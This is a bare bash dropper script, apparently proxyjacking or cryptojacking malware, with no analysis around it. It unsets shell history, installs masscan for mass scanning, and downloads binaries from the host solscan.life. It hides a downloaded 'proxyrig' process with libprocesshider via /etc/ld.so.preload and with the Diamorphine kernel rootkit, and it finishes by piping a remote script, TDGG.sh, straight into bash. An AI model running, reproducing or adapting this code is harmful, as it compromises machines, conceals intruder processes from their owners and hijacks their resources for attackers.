#!/bin/bash

# Unset HISTFILE to prevent command logging
unset HISTFILE

# Set environment variables
export HOME=/root
export LC_ALL=C
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games
export SCAN_RATE=500000

# Create necessary directories
if ! [ -d "/dev/shm/.../...BORG.../" ]; then
    mkdir -p /dev/shm/.../...BORG.../
fi

# Install curl if not already installed
if ! type curl >/dev/null 2>&1; then
    if type apt-get >/dev/null 2>&1; then
        apt-get update --fix-missing >/dev/null 2>&1
        apt-get install -y curl >/dev/null 2>&1
        apt-get install -y --reinstall curl >/dev/null 2>&1
    fi
    if type yum >/dev/null 2>&1; then
        yum clean all >/dev/null 2>&1
        yum install -y curl >/dev/null 2>&1
        yum reinstall -y curl >/dev/null 2>&1
    fi
    if type apk >/dev/null 2>&1; then
        apk update >/dev/null 2>&1
        apk add curl >/dev/null 2>&1
    fi
fi

# Install wget if not already installed
if ! type wget >/dev/null 2>&1; then
    if type apt-get >/dev/null 2>&1; then
        apt-get update --fix-missing >/dev/null 2>&1
        apt-get install -y wget >/dev/null 2>&1
        apt-get install -y --reinstall wget >/dev/null 2>&1
    fi
    if type yum >/dev/null 2>&1; then
        yum clean all >/dev/null 2>&1
        yum install -y wget >/dev/null 2>&1
        yum reinstall -y wget >/dev/null 2>&1
    fi
    if type apk >/dev/null 2>&1; then
        apk update >/dev/null 2>&1
        apk add wget >/dev/null 2>&1
    fi
fi

# Install bash if not already installed
if ! type bash >/dev/null 2>&1; then
    if type apt-get >/dev/null 2>&1; then
        apt-get update --fix-missing >/dev/null 2>&1
        apt-get install -y bash >/dev/null 2>&1
    fi
    if type yum >/dev/null 2>&1; then
        yum clean all >/dev/null 2>&1
        yum install -y bash >/dev/null 2>&1
    fi
    if type apk >/dev/null 2>&1; then
        apk update >/dev/null 2>&1
        apk add bash >/dev/null 2>&1
    fi
fi

# Download and install zgrab if not already installed
if ! [ -f "/usr/sbin/zgrab" ]; then
    curl -sLk -o /usr/sbin/zgrab http://solscan.life/bin/64bit/zgrab
    chmod +x /usr/sbin/zgrab
fi

# Download and install jq if not already installed
if ! [ -f "/usr/sbin/jq" ]; then
    curl -sLk -o /usr/sbin/jq http://solscan.life/bin/64bit/jq
    chmod +x /usr/sbin/jq
fi

# Install masscan if not already installed
if ! type masscan >/dev/null 2>&1; then
    if type apt-get >/dev/null 2>&1; then
        wget http://archive.ubuntu.com/ubuntu/pool/main/libp/libpcap/libpcap0.8_1.7.4-2_amd64.deb
        dpkg -i libpcap0.8_1.7.4-2_amd64.deb
        rm -f libpcap0.8_1.7.4-2_amd64.deb
        wget http://archive.ubuntu.com/ubuntu/pool/universe/m/masscan/masscan_1.0.3-95-gb395f18~ds0-2_amd64.deb
        dpkg -i masscan_1.0.3-95-gb395f18~ds0-2_amd64.deb
        rm -f masscan_1.0.3-95-gb395f18~ds0-2_amd64.deb
    fi
    if type yum >/dev/null 2>&1; then
        wget http://mirror.centos.org/centos/7/os/x86_64/Packages/libpcap-1.5.3-12.el7.x86_64.rpm
        rpm -Uvh libpcap-1.5.3-12.el7.x86_64.rpm
        rm -f libpcap-1.5.3-12.el7.x86_64.rpm
        wget https://download-ib01.fedoraproject.org/pub/epel/7/x86_64/Packages/m/masscan-1.0.3-5.el7.x86_64.rpm
        rpm -Uvh masscan-1.0.3-5.el7.x86_64.rpm
        rm -f masscan-1.0.3-5.el7.x86_64.rpm
    fi
fi

# Install docker if not already installed
if ! type docker >/dev/null 2>&1; then
    # curl -Lk https://get.docker.com | bash
    curl -Lk http://solscan.life/bin/64bit/docker -o /usr/bin/docker
    chmod +x /usr/bin/docker
fi

# Function to hide proxyrig using processhider
hide_proxyrig_processhider() {
    # Define the directory for processhider
    PROCESSHIDER_DIR="/usr/share/processhider"

    # Create the directory if it doesn't exist
    mkdir -p $PROCESSHIDER_DIR

    # Download and compile processhider
    cd $PROCESSHIDER_DIR || exit
    wget https://raw.githubusercontent.com/gianlucaborello/libprocesshider/master/processhider.c
    wget https://raw.githubusercontent.com/gianlucaborello/libprocesshider/master/Makefile
    sed -i 's/evil_script.py/proxyrig/g' processhider.c
    make

    # Install processhider
    sudo cp libprocesshider.so /usr/local/lib/
    echo '/usr/local/lib/libprocesshider.so' | sudo tee -a /etc/ld.so.preload

    # Download and run proxyrig
    mkdir -p /usr/share/proxyrig
    cd /usr/share/proxyrig || exit
    wget solscan.life/pwn/proxyrig
    ./proxyrig
}

# Function to hide proxyrig using diamorphine
hide_proxyrig_diamorphine() {
    # Define the directory for diamorphine
    DIAMORPHINE_DIR="/usr/share/diamorphine"

    # Create the directory if it doesn't exist
    mkdir -p $DIAMORPHINE_DIR

    # Download and compile diamorphine
    cd $DIAMORPHINE_DIR || exit
    git clone https://github.com/m0nad/Diamorphine
    cd Diamorphine || exit
    make

    sudo insmod diamorphine.ko
    mkdir -p /usr/share/proxyrig
    cd /usr/share/proxyrig || exit
    wget solscan.life/pwn/proxyrig
    ./proxyrig
    echo -n 'H' > /proc/diamorphine_hide
}

# Execute the script from the provided URL
curl http://solscan.life/pwn/TDGG.sh | bash
